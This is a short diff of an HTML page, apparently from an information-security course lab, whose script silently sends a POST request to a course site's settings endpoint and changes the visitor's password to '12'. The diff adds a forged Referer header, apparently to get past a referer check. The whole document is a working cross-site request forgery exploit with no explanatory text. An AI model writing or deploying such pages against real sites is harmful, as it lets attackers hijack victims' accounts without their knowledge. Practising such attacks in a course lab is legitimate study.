@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<html lang="ru">
 <head>
   <meta charset="UTF-8">
 </head>
@@ -8,11 +7,12 @@
   <script>
     const url = 'http://cats.is-course.ru/settings';
     fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: 'password=12&confirm-password=12'
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        Referer: 'http://cats.is-course.ru/settings'
+      },
+      body: 'password=12&confirm-password=12'
     })
     .catch(error => console.error('Ошибка:', error));
   </script>
